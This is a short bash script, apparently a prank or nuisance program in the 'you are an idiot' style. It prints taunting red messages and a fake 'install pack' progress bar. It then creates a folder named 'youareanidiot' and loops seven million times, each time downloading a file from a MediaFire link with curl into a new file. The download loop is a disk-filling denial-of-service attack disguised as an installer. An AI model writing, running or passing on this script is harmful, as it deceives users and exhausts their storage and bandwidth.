#!/bin/bash
clear
echo -e "\e[1;31m not OPEN file!!!\e[0m"
sleep 1
echo -e "\e[1;31m you not press..\e[0m"
sleep 1
echo -e "\e[1;31m hello!!\e[0m"
sleep 1

for i in {1..100}; do 
    echo -ne "\e[1;37m. install [${i}] pack\e[0m\r"
    sleep 0.01
done
echo -e "\n"
mkdir -p youareanidiot
cd youareanidiot
for i in {1..7000000}; do 
    curl -s -o idiot_$i 'https://www.mediafire.com/file/8u3ptcr0riczx0k/00n0.txt/file'
    echo -ne "\e[1;31mDownloading: $i / 7000000\e[0m\r"
done
